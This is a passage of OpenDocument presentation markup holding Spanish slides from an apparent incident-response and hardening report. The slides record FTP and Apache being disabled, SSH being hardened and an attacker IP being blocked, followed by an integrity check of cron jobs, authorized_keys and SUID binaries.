          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id303" draw:style-name="a893" draw:name="Image 3" svg:x="0.44in" svg:y="2.78in" svg:width="0.42in" svg:height="0.42in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image13.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="4.3in" svg:y="2.78in" svg:width="0.55in" svg:height="0.55in" draw:id="id304" draw:style-name="a894" draw:name="Shape 2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3in" svg:y="2.8in" svg:width="0.55in" svg:height="0.5in" draw:id="id305" draw:style-name="a898" draw:name="Text 21">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a897" text:class-names="" text:cond-style-name=""><text:span text:style-name="a895" text:class-names="">✓</text:span><text:span text:style-name="a896" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.97in" svg:y="2.8in" svg:width="3.3in" svg:height="0.32in" draw:id="id306" draw:style-name="a902" draw:name="Text 22">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a901" text:class-names="" text:cond-style-name=""><text:span text:style-name="a899" text:class-names="">Servicios FTP y Apache deshabilitados</text:span><text:span text:style-name="a900" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.44in" svg:y="3.28in" svg:width="4.45in" svg:height="0.26in" draw:id="id307" draw:style-name="a903" draw:name="Shape 23">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.5in" svg:y="3.3in" svg:width="4.33in" svg:height="0.22in" draw:id="id308" draw:style-name="a907" draw:name="Text 24">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a906" text:class-names="" text:cond-style-name=""><text:span text:style-name="a904" text:class-names="">ANTES: vsftpd.service: active (running) | apache2.service: active (running)</text:span><text:span text:style-name="a905" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.44in" svg:y="3.6in" svg:width="4.45in" svg:height="0.26in" draw:id="id309" draw:style-name="a908" draw:name="Shape 25">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.5in" svg:y="3.62in" svg:width="4.33in" svg:height="0.22in" draw:id="id310" draw:style-name="a912" draw:name="Text 26">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a911" text:class-names="" text:cond-style-name=""><text:span text:style-name="a909" text:class-names="">AHORA: vsftpd: inactive (dead) / disabled | apache2: inactive (dead) / disabled</text:span><text:span text:style-name="a910" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="2.7in" svg:width="4.72in" svg:height="1.28in" draw:id="id311" draw:style-name="a913" draw:name="Shape 27">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id312" draw:style-name="a914" draw:name="Image 4" svg:x="5.3in" svg:y="2.78in" svg:width="0.42in" svg:height="0.42in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image17.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="9.16in" svg:y="2.78in" svg:width="0.55in" svg:height="0.55in" draw:id="id313" draw:style-name="a915" draw:name="Shape 2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16in" svg:y="2.8in" svg:width="0.55in" svg:height="0.5in" draw:id="id314" draw:style-name="a919" draw:name="Text 29">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a918" text:class-names="" text:cond-style-name=""><text:span text:style-name="a916" text:class-names="">✓</text:span><text:span text:style-name="a917" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.83in" svg:y="2.8in" svg:width="3.3in" svg:height="0.32in" draw:id="id315" draw:style-name="a923" draw:name="Text 30">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a922" text:class-names="" text:cond-style-name=""><text:span text:style-name="a920" text:class-names="">Solo puerto SSH activo</text:span><text:span text:style-name="a921" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.3in" svg:y="3.28in" svg:width="4.45in" svg:height="0.26in" draw:id="id316" draw:style-name="a924" draw:name="Shape 31">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.36in" svg:y="3.3in" svg:width="4.33in" svg:height="0.22in" draw:id="id317" draw:style-name="a928" draw:name="Text 32">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a927" text:class-names="" text:cond-style-name=""><text:span text:style-name="a925" text:class-names="">ANTES: Puertos abiertos: 21 (FTP), 22 (SSH), 80 (HTTP)</text:span><text:span text:style-name="a926" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.3in" svg:y="3.6in" svg:width="4.45in" svg:height="0.26in" draw:id="id318" draw:style-name="a929" draw:name="Shape 33">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.36in" svg:y="3.62in" svg:width="4.33in" svg:height="0.22in" draw:id="id319" draw:style-name="a933" draw:name="Text 34">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a932" text:class-names="" text:cond-style-name=""><text:span text:style-name="a930" text:class-names="">AHORA: ss -tulnp → Solo puerto 22 (SSH) en escucha</text:span><text:span text:style-name="a931" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="4.12in" svg:width="4.72in" svg:height="1.28in" draw:id="id320" draw:style-name="a934" draw:name="Shape 35">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id321" draw:style-name="a935" draw:name="Image 5" svg:x="0.44in" svg:y="4.2in" svg:width="0.42in" svg:height="0.42in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image14.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="4.3in" svg:y="4.2in" svg:width="0.55in" svg:height="0.55in" draw:id="id322" draw:style-name="a936" draw:name="Shape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3in" svg:y="4.22in" svg:width="0.55in" svg:height="0.5in" draw:id="id323" draw:style-name="a940" draw:name="Text 37">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a939" text:class-names="" text:cond-style-name=""><text:span text:style-name="a937" text:class-names="">✓</text:span><text:span text:style-name="a938" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.97in" svg:y="4.22in" svg:width="3.3in" svg:height="0.32in" draw:id="id324" draw:style-name="a944" draw:name="Text 38">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a943" text:class-names="" text:cond-style-name=""><text:span text:style-name="a941" text:class-names="">Atacante bloqueado en firewall</text:span><text:span text:style-name="a942" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.44in" svg:y="4.7in" svg:width="4.45in" svg:height="0.26in" draw:id="id325" draw:style-name="a945" draw:name="Shape 39">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.5in" svg:y="4.72in" svg:width="4.33in" svg:height="0.22in" draw:id="id326" draw:style-name="a949" draw:name="Text 40">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a948" text:class-names="" text:cond-style-name=""><text:span text:style-name="a946" text:class-names="">ANTES: Tráfico libre hacia 192.168.1.100</text:span><text:span text:style-name="a947" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.44in" svg:y="5.02in" svg:width="4.45in" svg:height="0.26in" draw:id="id327" draw:style-name="a950" draw:name="Shape 41">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.5in" svg:y="5.04in" svg:width="4.33in" svg:height="0.22in" draw:id="id328" draw:style-name="a954" draw:name="Text 42">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a953" text:class-names="" text:cond-style-name=""><text:span text:style-name="a951" text:class-names="">AHORA: UFW: 192.168.1.100 <text:s text:c="2"/>DENY OUT <text:s text:c="2"/>Anywhere</text:span><text:span text:style-name="a952" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="4.12in" svg:width="4.72in" svg:height="1.28in" draw:id="id329" draw:style-name="a955" draw:name="Shape 43">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id330" draw:style-name="a956" draw:name="Image 6" svg:x="5.3in" svg:y="4.2in" svg:width="0.42in" svg:height="0.42in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image19.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="9.16in" svg:y="4.2in" svg:width="0.55in" svg:height="0.55in" draw:id="id331" draw:style-name="a957" draw:name="Shape 4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16in" svg:y="4.22in" svg:width="0.55in" svg:height="0.5in" draw:id="id332" draw:style-name="a961" draw:name="Text 45">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a960" text:class-names="" text:cond-style-name=""><text:span text:style-name="a958" text:class-names="">✓</text:span><text:span text:style-name="a959" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.83in" svg:y="4.22in" svg:width="3.3in" svg:height="0.32in" draw:id="id333" draw:style-name="a965" draw:name="Text 46">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a964" text:class-names="" text:cond-style-name=""><text:span text:style-name="a962" text:class-names="">SSH endurecido</text:span><text:span text:style-name="a963" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.3in" svg:y="4.7in" svg:width="4.45in" svg:height="0.26in" draw:id="id334" draw:style-name="a966" draw:name="Shape 47">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.36in" svg:y="4.72in" svg:width="4.33in" svg:height="0.22in" draw:id="id335" draw:style-name="a970" draw:name="Text 48">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a969" text:class-names="" text:cond-style-name=""><text:span text:style-name="a967" text:class-names="">ANTES: #PermitRootLogin prohibit-password <text:s text:c="1"/>(comentado)</text:span><text:span text:style-name="a968" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.3in" svg:y="5.02in" svg:width="4.45in" svg:height="0.26in" draw:id="id336" draw:style-name="a971" draw:name="Shape 49">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.36in" svg:y="5.04in" svg:width="4.33in" svg:height="0.22in" draw:id="id337" draw:style-name="a975" draw:name="Text 50">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a974" text:class-names="" text:cond-style-name=""><text:span text:style-name="a972" text:class-names="">AHORA: PermitRootLogin no <text:s text:c="1"/>(explícito — root bloqueado por red)</text:span><text:span text:style-name="a973" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <presentation:notes draw:style-name="a981">
          <draw:page-thumbnail draw:page-number="8" svg:x="-0.1875in" svg:y="1.25in" svg:width="6in" svg:height="3.375in" presentation:class="page" draw:id="id338" presentation:style-name="a976" draw:name="Slide Image Placeholder 1">
            <svg:title/>
            <svg:desc/>
          </draw:page-thumbnail>
          <draw:frame draw:id="id339" presentation:style-name="a977" draw:name="Notes Placeholder 2" svg:x="0.5625in" svg:y="4.8125in" svg:width="4.5in" svg:height="3.9375in" presentation:class="notes" presentation:placeholder="true">
            <draw:text-box/>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
          <draw:frame draw:id="id340" presentation:style-name="a980" draw:name="Slide Number Placeholder 3" svg:x="3.18576in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="page-number" presentation:placeholder="false">
            <draw:text-box>
              <text:p text:style-name="a979" text:class-names="" text:cond-style-name=""><text:span text:style-name="a978" text:class-names=""><text:page-number style:num-format="1" text:fixed="false">8</text:page-number></text:span></text:p>
            </draw:text-box>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
        </presentation:notes>
      </draw:page>
      <draw:page draw:name="Slide 9" draw:style-name="a982" draw:master-page-name="Master1-Layout1-cust-DEFAULT" presentation:presentation-page-layout-name="Master1-PPL1" draw:id="Slide-264">
        <draw:custom-shape svg:x="0in" svg:y="0in" svg:width="10in" svg:height="1.2in" draw:id="id341" draw:style-name="a983" draw:name="Shape 0">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id342" draw:style-name="a984" draw:name="Image 0" svg:x="0.32in" svg:y="0.28in" svg:width="0.58in" svg:height="0.58in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image8.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.05in" svg:y="0.1in" svg:width="9.2in" svg:height="0.55in" draw:id="id343" draw:style-name="a988" draw:name="Text 1">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a987" text:class-names="" text:cond-style-name=""><text:span text:style-name="a985" text:class-names="">Verificación Exhaustiva de Integridad</text:span><text:span text:style-name="a986"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344" draw:style-name="a992" draw:name="Text 2">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a991" text:class-names="" text:cond-style-name=""><text:span text:style-name="a989" text:class-names="">Búsqueda sistemática para confirmar que no queda ningún rastro del atacante</text:span><text:span text:style-name="a990" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="1.28in" svg:width="4.72in" svg:height="1.28in" draw:id="id345" draw:style-name="a993" draw:name="Shape 3">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id346" draw:style-name="a994" draw:name="Image 1" svg:x="0.44in" svg:y="1.38in" svg:width="0.42in" svg:height="0.42in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image18.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="0.97in" svg:y="1.38in" svg:width="4in" svg:height="0.32in" draw:id="id347" draw:style-name="a998" draw:name="Text 4">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a997" text:class-names="" text:cond-style-name=""><text:span text:style-name="a995" text:class-names="">Tareas automáticas de todos los usuarios</text:span><text:span text:style-name="a996" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.97in" svg:y="1.72in" svg:width="4in" svg:height="0.28in" draw:id="id348" draw:style-name="a1002" draw:name="Text 5">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1001" text:class-names="" text:cond-style-name=""><text:span text:style-name="a999" text:class-names="">Sin tareas maliciosas</text:span><text:span text:style-name="a1000" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.44in" svg:y="2.1in" svg:width="4.45in" svg:height="0.38in" draw:id="id349" draw:style-name="a1006" draw:name="Text 6">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1005" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1003" text:class-names="">Solo sysadmin tiene cron. Vacío para todos los demás.</text:span><text:span text:style-name="a1004" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="1.28in" svg:width="4.72in" svg:height="1.28in" draw:id="id350" draw:style-name="a1007" draw:name="Shape 7">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id351" draw:style-name="a1008" draw:name="Image 2" svg:x="5.3in" svg:y="1.38in" svg:width="0.42in" svg:height="0.42in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image18.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="5.83in" svg:y="1.38in" svg:width="4in" svg:height="0.32in" draw:id="id352" draw:style-name="a1012" draw:name="Text 8">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1011" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1009" text:class-names="">Claves de acceso SSH autorizadas</text:span><text:span text:style-name="a1010" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.83in" svg:y="1.72in" svg:width="4in" svg:height="0.28in" draw:id="id353" draw:style-name="a1016" draw:name="Text 9">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1015" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1013" text:class-names="">Sin claves del atacante</text:span><text:span text:style-name="a1014" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.3in" svg:y="2.1in" svg:width="4.45in" svg:height="0.38in" draw:id="id354" draw:style-name="a1020" draw:name="Text 10">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1019" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1017" text:class-names="">Ningún archivo authorized_keys tiene contenido.</text:span><text:span text:style-name="a1018" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="2.7in" svg:width="4.72in" svg:height="1.28in" draw:id="id355" draw:style-name="a1021" draw:name="Shape 11">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id356" draw:style-name="a1022" draw:name="Image 3" svg:x="0.44in" svg:y="2.8in" svg:width="0.42in" svg:height="0.42in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image18.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="0.97in" svg:y="2.8in" svg:width="4in" svg:height="0.32in" draw:id="id357" draw:style-name="a1026" draw:name="Text 12">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1025" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1023" text:class-names="">Programas con permisos elevados (SUID)</text:span><text:span text:style-name="a1024" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.97in" svg:y="3.14in" svg:width="4in" svg:height="0.28in" draw:id="id358" draw:style-name="a1030" draw:name="Text 13">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1029" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1027" text:class-names="">Solo programas estándar</text:span><text:span text:style-name="a1028" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.44in" svg:y="3.52in" svg:width="4.45in" svg:height="0.38in" draw:id="id359" draw:style-name="a1034" draw:name="Text 14">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a1033" text:class-names="" text:cond-style-name=""><text:span text:style-name="a1031" text:class-names="">su, sudo, passwd, mount — todos del sistema base.</text:span><text:span text:style-name="a1032" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
